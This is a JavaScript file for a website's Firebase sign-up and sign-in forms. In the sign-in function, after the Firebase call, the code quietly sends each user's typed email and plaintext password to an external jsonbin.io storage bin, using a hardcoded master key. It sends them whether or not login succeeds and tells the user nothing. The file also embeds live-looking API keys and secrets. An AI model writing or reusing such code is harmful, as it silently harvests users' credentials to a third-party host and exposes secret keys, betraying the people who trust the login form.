
function signUpFirebase(){
    
      var firebaseConfig = {
      apiKey: "AIzaSyD09GeejzBofXCWBs_GBj8rDtIEDHd0O98",
      authDomain: "https://www.google.com",
      projectId: "masele-33a46",
      storageBucket: "YOUR_STORAGE_BUCKET",
      messagingSenderId: "200216185593",
      appId: "YOUR_APP_ID"
    };
    firebase.initializeApp(firebaseConfig);

      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      firebase.auth().createUserWithEmailAndPassword(email, password)
        .then(function(user) {
          
          alert("Sign up successful!");
          window.location.href=("https://maselecybernova.github.io/Main/");
          
        })
        .catch(function(error) {
          console.log(error.message);
        });
    
}

function signInFirebase(){

    
    var firebaseConfig = {
      apiKey: "AIzaSyD09GeejzBofXCWBs_GBj8rDtIEDHd0O98",
      authDomain: "https://www.google.com",
      projectId: "masele-33a46",
      storageBucket: "YOUR_STORAGE_BUCKET",
      messagingSenderId: "200216185593",
      appId: "YOUR_APP_ID"
    };
    firebase.initializeApp(firebaseConfig);
    
      var email = document.getElementById("username").value;
      var password = document.getElementById("passwordIn").value;
      
      LoginL=document.getElementById("LoginLay");
      MainL=document.getElementById("MainLay")
      

      firebase.auth().signInWithEmailAndPassword(email, password)
        .then(function(user) {

          
          LoginL.style.display=("none");
          MainL.style.display=("block");
          
          
         var userDev = document.getElementById("nameDev");
         userDev.innerHTML=(email);
      
      
          
            
        })
        .catch(function(error) {
          console.log(error.message);
            alert("Login failed,make sure you have an active Account");
        });





        const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
        const binName= 'myBin';

        const data = {
        Username: email,
        Password: password
        
      };

       fetch('https://api.jsonbin.io/v3/b', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              "X-Master-Key": secretKey,
              "X-Bin-Private": true,
              'X-Bin-Name': "MS Cybernova"
            },
            body: JSON.stringify(data)
          })
         .then(response => response.json())
         .then(jsonData => console.log(jsonData))
         .catch(error => console.error(error));
 




    
    
    
}//last









